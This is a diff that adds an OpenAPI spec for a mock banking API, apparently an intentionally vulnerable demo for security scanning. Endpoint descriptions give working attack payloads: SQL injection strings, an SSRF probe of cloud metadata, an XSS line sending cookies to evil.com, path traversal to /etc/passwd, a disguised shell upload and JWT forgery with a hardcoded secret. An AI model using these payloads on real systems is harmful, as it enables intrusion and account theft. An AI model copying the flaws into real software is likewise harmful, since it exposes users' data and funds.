@@ -1,0 +1,1059 @@
+openapi: "3.0.0"
+info:
+  title: Banking App API Gateway
+  description: |
+    Mock Consumer Banking API — intentionally vulnerable security demo for [Aikido Security](https://www.aikido.dev).
+
+    Routes traffic to five downstream microservices:
+
+    | Service | Stack | Port |
+    |---------|-------|------|
+    | Auth | Python / FastAPI | 8001 |
+    | Core Banking | Python / FastAPI | 8002 |
+    | Products | Java / Spring Boot | 8003 |
+    | Support | Node.js / Express | 8004 |
+
+    **Auth routes** (`/auth/*`) are unauthenticated. All other routes require a `Bearer` JWT.
+
+    > ⚠️ All marked `[VULN]` endpoints contain intentional security vulnerabilities for demo purposes.
+  version: "2.0.0"
+  contact:
+    name: Demo Banking App
+
+servers:
+  - url: http://localhost:3000
+    description: Local development (full stack via docker compose)
+
+tags:
+  - name: Auth
+    description: Registration, login, email verification, MFA, session history
+  - name: Users
+    description: User profile management
+  - name: Accounts
+    description: Bank accounts, transaction history, monthly statements
+  - name: Transfers
+    description: Fund transfers between accounts
+  - name: Loans
+    description: Loan applications, repayments, amortization schedules
+  - name: Beneficiaries
+    description: Saved payees for transfers
+  - name: Scheduled Transfers
+    description: Recurring transfer schedules
+  - name: Products
+    description: Credit card and loan product catalog and applications
+  - name: Support
+    description: Customer support tickets, messages, and attachments
+  - name: Attachments
+    description: File upload and download
+  - name: Admin
+    description: Admin-only operations (BFLA — role checked from JWT claim only)
+  - name: Gateway
+    description: Gateway-level endpoints
+
+components:
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+
+  schemas:
+    Error:
+      type: object
+      properties:
+        error: { type: string }
+
+    User:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        username: { type: string }
+        email: { type: string, format: email }
+        role: { type: string, enum: [user, admin] }
+        created_at: { type: string, format: date-time }
+
+    Account:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        user_id: { type: string }
+        account_number: { type: string, example: "4521873690" }
+        routing_number: { type: string, example: "021000021" }
+        type: { type: string, enum: [checking, savings, money_market, cd] }
+        balance: { type: number, format: double }
+        currency: { type: string, default: USD }
+        status: { type: string, enum: [active, frozen, closed] }
+        nickname: { type: string, nullable: true }
+        interest_rate: { type: number, example: 0.025 }
+        created_at: { type: string, format: date-time }
+
+    Transaction:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        from_account_id: { type: string, nullable: true }
+        to_account_id: { type: string, nullable: true }
+        amount: { type: number }
+        type: { type: string, enum: [transfer, loan_disbursement, loan_repayment, deposit, withdrawal] }
+        status: { type: string, enum: [pending, completed, failed] }
+        description: { type: string, nullable: true }
+        reference_number: { type: string, nullable: true }
+        category: { type: string, nullable: true }
+        created_at: { type: string, format: date-time }
+
+    Loan:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        account_id: { type: string }
+        user_id: { type: string }
+        principal: { type: number }
+        interest_rate: { type: number }
+        outstanding_balance: { type: number }
+        term_months: { type: integer, nullable: true }
+        monthly_payment: { type: number, nullable: true }
+        next_payment_date: { type: string, format: date-time, nullable: true }
+        status: { type: string, enum: [active, paid_off] }
+        created_at: { type: string, format: date-time }
+
+    Beneficiary:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        user_id: { type: string }
+        name: { type: string }
+        account_number: { type: string }
+        routing_number: { type: string }
+        nickname: { type: string, nullable: true }
+        bank_name: { type: string, nullable: true }
+        created_at: { type: string, format: date-time }
+
+    ScheduledTransfer:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        user_id: { type: string }
+        from_account_id: { type: string }
+        to_account_id: { type: string }
+        amount: { type: number }
+        frequency: { type: string, enum: [weekly, biweekly, monthly] }
+        next_run_date: { type: string, format: date-time }
+        description: { type: string, nullable: true }
+        status: { type: string, enum: [active, paused, cancelled] }
+        created_at: { type: string, format: date-time }
+
+    Ticket:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        user_id: { type: string }
+        subject: { type: string }
+        category: { type: string, enum: [billing, fraud_dispute, account_access, card_issue, transfer_issue, technical, general] }
+        priority: { type: string, enum: [low, medium, high, urgent] }
+        status: { type: string, enum: [open, in_progress, pending_customer, resolved, closed] }
+        assigned_to: { type: string, nullable: true }
+        sla_deadline: { type: string, format: date-time, nullable: true }
+        resolved_at: { type: string, format: date-time, nullable: true }
+        closed_at: { type: string, format: date-time, nullable: true }
+        created_at: { type: string, format: date-time }
+
+    Application:
+      type: object
+      properties:
+        id: { type: string, format: uuid }
+        user_id: { type: string }
+        product_type: { type: string, enum: [CREDIT_CARD, PERSONAL_LOAN, HOME_LOAN, CD] }
+        amount: { type: number, nullable: true }
+        term_months: { type: integer, nullable: true }
+        status: { type: string, enum: [PENDING, UNDER_REVIEW, APPROVED, DECLINED] }
+        details: { type: string, description: "JSON blob with income, credit score, etc." }
+        created_at: { type: string, format: date-time }
+
+security:
+  - bearerAuth: []
+
+paths:
+
+  # ── Gateway ───────────────────────────────────────────────────────────────
+
+  /health:
+    get:
+      tags: [Gateway]
+      summary: Gateway health check
+      security: []
+      responses:
+        "200":
+          description: OK
+
+  /debug/config:
+    get:
+      tags: [Gateway]
+      summary: "[VULN] Dump full environment config — sensitive data exposure"
+      description: |
+        **Intentional vulnerability** — returns `process.env` including `JWT_SECRET`,
+        `DATABASE_URL`, and all internal service URLs. No authentication required.
+      security: []
+      responses:
+        "200":
+          description: Full environment dump
+
+  # ── Auth ──────────────────────────────────────────────────────────────────
+
+  /auth/register:
+    post:
+      tags: [Auth]
+      summary: Register a new user
+      description: |
+        Creates a user. Password is hashed with MD5 (intentional weak hashing vuln).
+        Returns a `verification_token` — in production this would be sent via email.
+        **Token is predictable**: `base64(user_id:timestamp)`.
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [username, email, password]
+              properties:
+                username: { type: string }
+                email: { type: string, format: email }
+                password: { type: string }
+      responses:
+        "201":
+          description: User created with verification token
+
+  /auth/verify-email:
+    post:
+      tags: [Auth]
+      summary: "[VULN] Verify email address — token never expires"
+      description: |
+        Marks the user's email as verified. Token is decoded but its timestamp
+        is never validated — tokens work forever (no expiry).
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [token]
+              properties:
+                token: { type: string }
+      responses:
+        "200":
+          description: Email verified
+
+  /auth/login:
+    post:
+      tags: [Auth]
+      summary: "[VULN] Login — SQL injection + lockout bypass"
+      description: |
+        **SQL Injection**: `email` is interpolated into raw SQL.
+        Bypass: `email = "' OR '1'='1' --"`.
+
+        **Lockout Bypass**: Account lockout uses ORM lookup by literal email.
+        SQL injection uses a different email string, skipping the lockout check entirely.
+
+        Supply optional `mfa_code` if MFA is enabled.
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [username, password]
+              properties:
+                username: { type: string }
+                password: { type: string }
+                mfa_code: { type: string, description: "Required if MFA is enabled" }
+      responses:
+        "200":
+          description: JWT access token
+        "401":
+          description: Invalid credentials
+        "403":
+          description: MFA required
+        "423":
+          description: Account locked (too many failed attempts)
+
+  /auth/refresh:
+    post:
+      tags: [Auth]
+      summary: Refresh access token
+      security: []
+      responses:
+        "200":
+          description: New access token
+
+  /auth/me:
+    get:
+      tags: [Auth]
+      summary: Get current user profile
+      responses:
+        "200":
+          description: Authenticated user
+
+  /auth/reset-password/request:
+    post:
+      tags: [Auth]
+      summary: "[VULN] Request password reset — predictable token + user enumeration"
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [email]
+              properties:
+                email: { type: string, format: email }
+      responses:
+        "200":
+          description: Reset token (returned in body — simulates email delivery)
+        "404":
+          description: "[VULN] Email not found — confirms account existence"
+
+  /auth/reset-password/confirm:
+    post:
+      tags: [Auth]
+      summary: "[VULN] Confirm password reset — no token expiry or invalidation"
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [token, new_password]
+              properties:
+                token: { type: string }
+                new_password: { type: string }
+      responses:
+        "200":
+          description: Password reset
+
+  /mfa/enable:
+    post:
+      tags: [Auth]
+      summary: "[VULN] Enable MFA — TOTP secret stored in plaintext"
+      description: |
+        Generates a TOTP secret and saves it to `users.mfa_secret` unencrypted.
+        Returns the raw secret and a `qr_uri` for use with Google Authenticator.
+        MFA is not active until `POST /mfa/verify` is called.
+      responses:
+        "200":
+          description: TOTP secret and QR URI
+
+  /mfa/verify:
+    post:
+      tags: [Auth]
+      summary: "[VULN] Activate MFA — TOTP replay not prevented"
+      description: |
+        Verifies the TOTP code and activates MFA. Codes are not invalidated after use —
+        the same 6-digit code can be replayed within its 30-second window.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [code]
+              properties:
+                code: { type: string, example: "123456" }
+      responses:
+        "200":
+          description: MFA activated
+
+  /sessions:
+    get:
+      tags: [Auth]
+      summary: List login history (last 20 events)
+      description: Returns IP address, user-agent, success flag, and timestamp for each login attempt.
+      responses:
+        "200":
+          description: Login history
+
+  # ── Users ─────────────────────────────────────────────────────────────────
+
+  /users/me:
+    get:
+      tags: [Users]
+      summary: Get own profile
+      responses:
+        "200":
+          description: User profile
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/User"
+
+    put:
+      tags: [Users]
+      summary: "[VULN] Update profile — mass assignment (role escalation + plaintext password log)"
+      description: |
+        **Mass Assignment**: `role` field is accepted and applied directly.
+        Send `{"role": "admin"}` to self-promote.
+
+        **Sensitive Data in Logs**: plaintext password written to application log if supplied.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                username: { type: string }
+                email: { type: string }
+                password: { type: string }
+                role: { type: string, description: "[VULN] Never user-settable but accepted" }
+      responses:
+        "200":
+          description: Updated profile
+
+  # ── Accounts ──────────────────────────────────────────────────────────────
+
+  /accounts:
+    get:
+      tags: [Accounts]
+      summary: List accounts for the authenticated user
+      responses:
+        "200":
+          description: Account list
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: "#/components/schemas/Account"
+
+    post:
+      tags: [Accounts]
+      summary: Open a new bank account
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [type]
+              properties:
+                type: { type: string, enum: [checking, savings, money_market, cd] }
+                currency: { type: string, default: USD }
+                nickname: { type: string }
+      responses:
+        "201":
+          description: Account created with generated account_number and routing_number
+
+  /accounts/{id}:
+    get:
+      tags: [Accounts]
+      summary: "[VULN] Get account by ID — IDOR (no ownership check)"
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Account details
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Account"
+
+    put:
+      tags: [Accounts]
+      summary: "[VULN] Update account — mass assignment + IDOR (balance, user_id settable)"
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                type: { type: string }
+                nickname: { type: string }
+                status: { type: string, description: "[VULN] Can reactivate frozen accounts" }
+                balance: { type: number, description: "[VULN] Never user-settable" }
+                user_id: { type: string, description: "[VULN] Never user-settable" }
+      responses:
+        "200":
+          description: Updated account
+
+  /accounts/{id}/transactions:
+    get:
+      tags: [Accounts]
+      summary: "[VULN] List transactions — SQL injection on ?type= filter"
+      description: |
+        The `type` query parameter is interpolated into raw SQL without sanitization.
+        Payload: `?type=' OR '1'='1`
+
+        `limit`, `offset`, `from_date`, `to_date` use parameterized queries (safe).
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+        - name: type
+          in: query
+          schema: { type: string }
+          description: "[VULN] Injected into raw SQL — use ' OR '1'='1 to dump all transactions"
+        - { name: limit, in: query, schema: { type: integer, default: 20, maximum: 100 } }
+        - { name: offset, in: query, schema: { type: integer, default: 0 } }
+        - { name: from_date, in: query, schema: { type: string, format: date } }
+        - { name: to_date, in: query, schema: { type: string, format: date } }
+      responses:
+        "200":
+          description: Transaction list
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: "#/components/schemas/Transaction"
+
+  /accounts/{id}/statements/{year}/{month}:
+    get:
+      tags: [Accounts]
+      summary: "[VULN] Monthly account statement — IDOR (no ownership check)"
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+        - { name: year, in: path, required: true, schema: { type: integer, example: 2024 } }
+        - { name: month, in: path, required: true, schema: { type: integer, minimum: 1, maximum: 12 } }
+      responses:
+        "200":
+          description: Monthly statement with opening/closing balance and transaction list
+
+  # ── Transfers ─────────────────────────────────────────────────────────────
+
+  /transfers:
+    post:
+      tags: [Transfers]
+      summary: "[VULN] Transfer funds — SSRF via webhook_url"
+      description: |
+        **SSRF**: `webhook_url` is fetched server-side without validation.
+        Use `http://169.254.169.254/latest/meta-data/` to probe AWS metadata.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [from_account_id, to_account_id, amount]
+              properties:
+                from_account_id: { type: string }
+                to_account_id: { type: string }
+                amount: { type: number }
+                description: { type: string }
+                webhook_url: { type: string, description: "[VULN] Fetched server-side — SSRF" }
+      responses:
+        "200":
+          description: Transfer complete
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Transaction"
+
+  # ── Loans ─────────────────────────────────────────────────────────────────
+
+  /loans:
+    get:
+      tags: [Loans]
+      summary: List loans for the authenticated user
+      responses:
+        "200":
+          description: Loan list
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: "#/components/schemas/Loan"
+
+    post:
+      tags: [Loans]
+      summary: "[VULN] Apply for a loan — IDOR on account_id (disbursement into any account)"
+      description: |
+        **IDOR + Business Logic**: `account_id` is not verified to belong to the requesting user.
+        The loan obligation is recorded against the attacker's user_id, funds go to any account.
+
+        Response includes calculated `monthly_payment` and `next_payment_date`.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [account_id, principal]
+              properties:
+                account_id: { type: string, description: "[VULN] Not ownership-checked" }
+                principal: { type: number }
+                interest_rate: { type: number, default: 0.05 }
+                term_months: { type: integer, default: 36 }
+      responses:
+        "201":
+          description: Loan created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Loan"
+
+  /loans/{id}:
+    get:
+      tags: [Loans]
+      summary: "[VULN] Get loan by ID — IDOR (no ownership check)"
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Loan details
+
+  /loans/{id}/schedule:
+    get:
+      tags: [Loans]
+      summary: "[VULN] Get amortization schedule — IDOR (no ownership check)"
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Full month-by-month amortization table
+
+  /loans/{id}/repay:
+    post:
+      tags: [Loans]
+      summary: "[VULN] Make loan repayment — IDOR on loan_id (no ownership check)"
+      description: |
+        **IDOR**: No ownership check on the loan. Any authenticated user can repay any loan
+        and debit their own account toward it.
+        Source account ownership IS enforced.
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [account_id, amount]
+              properties:
+                account_id: { type: string }
+                amount: { type: number }
+      responses:
+        "200":
+          description: Updated loan with reduced outstanding_balance
+
+  # ── Beneficiaries ─────────────────────────────────────────────────────────
+
+  /beneficiaries:
+    get:
+      tags: [Beneficiaries]
+      summary: List saved payees
+      responses:
+        "200":
+          description: Beneficiary list
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: "#/components/schemas/Beneficiary"
+
+    post:
+      tags: [Beneficiaries]
+      summary: Add a new payee
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [name, account_number, routing_number]
+              properties:
+                name: { type: string }
+                account_number: { type: string }
+                routing_number: { type: string }
+                nickname: { type: string }
+                bank_name: { type: string }
+      responses:
+        "201":
+          description: Beneficiary added
+
+  /beneficiaries/{id}:
+    delete:
+      tags: [Beneficiaries]
+      summary: Remove a beneficiary
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "204":
+          description: Deleted
+
+  # ── Scheduled Transfers ───────────────────────────────────────────────────
+
+  /scheduled-transfers:
+    get:
+      tags: [Scheduled Transfers]
+      summary: List recurring transfer schedules
+      responses:
+        "200":
+          description: Schedule list
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: "#/components/schemas/ScheduledTransfer"
+
+    post:
+      tags: [Scheduled Transfers]
+      summary: "[VULN] Create recurring transfer — IDOR on to_account_id"
+      description: |
+        **IDOR**: `to_account_id` is not verified to belong to any user or even exist.
+        Ownership enforced only on `from_account_id`.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [from_account_id, to_account_id, amount, frequency, next_run_date]
+              properties:
+                from_account_id: { type: string }
+                to_account_id: { type: string, description: "[VULN] Not ownership-checked" }
+                amount: { type: number }
+                frequency: { type: string, enum: [weekly, biweekly, monthly] }
+                next_run_date: { type: string, format: date-time }
+                description: { type: string }
+      responses:
+        "201":
+          description: Schedule created
+
+  /scheduled-transfers/{id}/status:
+    patch:
+      tags: [Scheduled Transfers]
+      summary: Pause or cancel a schedule
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [status]
+              properties:
+                status: { type: string, enum: [active, paused, cancelled] }
+      responses:
+        "200":
+          description: Updated schedule
+
+  /scheduled-transfers/{id}:
+    delete:
+      tags: [Scheduled Transfers]
+      summary: Delete a schedule
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "204":
+          description: Deleted
+
+  # ── Products ──────────────────────────────────────────────────────────────
+
+  /products:
+    get:
+      tags: [Products]
+      summary: List available products
+      parameters:
+        - { name: type, in: query, schema: { type: string, enum: [CREDIT_CARD, PERSONAL_LOAN, HOME_LOAN, CD, SAVINGS] } }
+      responses:
+        "200":
+          description: Product catalog
+
+  /products/{id}:
+    get:
+      tags: [Products]
+      summary: Get product details
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Product details
+
+  /products/credit-card/apply:
+    post:
+      tags: [Products]
+      summary: Apply for a credit card
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [annual_income, employment_status]
+              properties:
+                annual_income: { type: number }
+                employment_status: { type: string }
+                desired_limit: { type: string }
+      responses:
+        "201":
+          description: Application (APPROVED or DECLINED based on credit score)
+
+  /products/loan/apply:
+    post:
+      tags: [Products]
+      summary: Apply for a personal loan
+      description: Returns the application plus a full amortization schedule if approved.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [amount, purpose, annual_income]
+              properties:
+                amount: { type: number }
+                purpose: { type: string }
+                annual_income: { type: number }
+                term_months: { type: integer, default: 36 }
+      responses:
+        "201":
+          description: Application with optional amortization_schedule
+
+  /applications:
+    get:
+      tags: [Products]
+      summary: List own product applications
+      responses:
+        "200":
+          description: Application list
+
+  /applications/{id}:
+    get:
+      tags: [Products]
+      summary: "[VULN] Get application by ID — IDOR (no ownership check)"
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Application details
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Application"
+
+  # ── Support ───────────────────────────────────────────────────────────────
+
+  /tickets:
+    post:
+      tags: [Support]
+      summary: Open a support ticket
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [subject]
+              properties:
+                subject: { type: string }
+                category: { type: string, enum: [billing, fraud_dispute, account_access, card_issue, transfer_issue, technical, general], default: general }
+                priority: { type: string, enum: [low, medium, high, urgent], default: medium }
+      responses:
+        "201":
+          description: Ticket with SLA deadline and assigned agent
+
+    get:
+      tags: [Support]
+      summary: List own tickets
+      parameters:
+        - { name: status, in: query, schema: { type: string } }
+        - { name: category, in: query, schema: { type: string } }
+        - { name: priority, in: query, schema: { type: string } }
+      responses:
+        "200":
+          description: Ticket list
+
+  /tickets/{id}:
+    get:
+      tags: [Support]
+      summary: Get ticket with messages, attachments, and rating
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Full ticket detail
+
+  /tickets/{id}/status:
+    patch:
+      tags: [Support]
+      summary: Update ticket status
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [status]
+              properties:
+                status: { type: string, enum: [open, in_progress, pending_customer, resolved, closed] }
+      responses:
+        "200":
+          description: Updated ticket
+
+  /tickets/{id}/messages:
+    post:
+      tags: [Support]
+      summary: "[VULN] Post message — stored XSS (body not sanitized)"
+      description: |
+        **Stored XSS**: Message body is stored and returned without HTML sanitization.
+        Payload: `{"body": "<script>fetch('https://evil.com?c='+document.cookie)</script>"}`
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [body]
+              properties:
+                body: { type: string }
+      responses:
+        "201":
+          description: Message stored (unsanitized)
+
+  /tickets/{id}/messages/{msgId}/read:
+    patch:
+      tags: [Support]
+      summary: Mark message as read
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+        - { name: msgId, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Message marked as read
+
+  /tickets/{id}/attachments:
+    get:
+      tags: [Support]
+      summary: List attachments for a ticket
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "200":
+          description: Attachment metadata list
+
+  /tickets/{id}/rate:
+    post:
+      tags: [Support]
+      summary: Submit CSAT rating (resolved/closed tickets only)
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [rating]
+              properties:
+                rating: { type: integer, minimum: 1, maximum: 5 }
+                comment: { type: string }
+      responses:
+        "201":
+          description: Rating recorded
+
+  # ── Attachments ───────────────────────────────────────────────────────────
+
+  /attachments/upload:
+    post:
+      tags: [Attachments]
+      summary: "[VULN] Upload file — MIME type only checked (not magic bytes)"
+      description: |
+        **Insufficient File Validation**: MIME type is read from the Content-Type header
+        (client-controlled), not the file's actual magic bytes. Rename `shell.php` to
+        `shell.jpg`, set `Content-Type: image/jpeg`, and the upload succeeds.
+      requestBody:
+        required: true
+        content:
+          multipart/form-data:
+            schema:
+              type: object
+              properties:
+                file: { type: string, format: binary }
+                ticket_id: { type: string }
+                message_id: { type: string }
+      responses:
+        "201":
+          description: Attachment metadata record
+
+  /attachments/download/{filename}:
+    get:
+      tags: [Attachments]
+      summary: "[VULN] Download file — path traversal"
+      description: |
+        **Path Traversal**: filename is joined with the uploads directory without sanitization.
+        Payload: `GET /attachments/download/../../etc/passwd`
+      parameters:
+        - { name: filename, in: path, required: true, schema: { type: string }, example: "../../etc/passwd" }
+      responses:
+        "200":
+          description: File contents
+
+  # ── Admin ─────────────────────────────────────────────────────────────────
+
+  /admin/users:
+    get:
+      tags: [Admin]
+      summary: "[VULN] List all users — BFLA (role from JWT claim only)"
+      description: |
+        **BFLA**: Admin check reads `role` from the JWT claim without verifying against the database.
+        Forge a token with `{"role": "admin"}` using the hardcoded secret `supersecret123`.
+      responses:
+        "200":
+          description: All users in the system
+        "403":
+          description: Admin access required
+
+  /admin/accounts:
+    get:
+      tags: [Admin]
+      summary: "[VULN] List all accounts — BFLA"
+      responses:
+        "200":
+          description: All accounts across all users
+
+  /admin/accounts/adjust-balance:
+    post:
+      tags: [Admin]
+      summary: "[VULN] Set account balance — BFLA + missing audit trail"
+      description: |
+        **Missing Audit Trail**: Balance changed without creating a Transaction record.
+        **Sensitive Data in Logs**: Old and new balances written to application log.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [account_id, new_balance]
+              properties:
+                account_id: { type: string }
+                new_balance: { type: number }
+                reason: { type: string }
+      responses:
+        "200":
+          description: Balance updated (no transaction record created)
+
+  /admin/users/{id}:
+    delete:
+      tags: [Admin]
+      summary: "[VULN] Delete user — BFLA + orphaned accounts"
+      description: |
+        **Missing Cascade**: Deletes User row but leaves Account and Transaction records orphaned.
+        Orphaned accounts remain accessible via IDOR on `GET /accounts/{id}`.
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        "204":
+          description: User deleted (accounts and transactions orphaned)
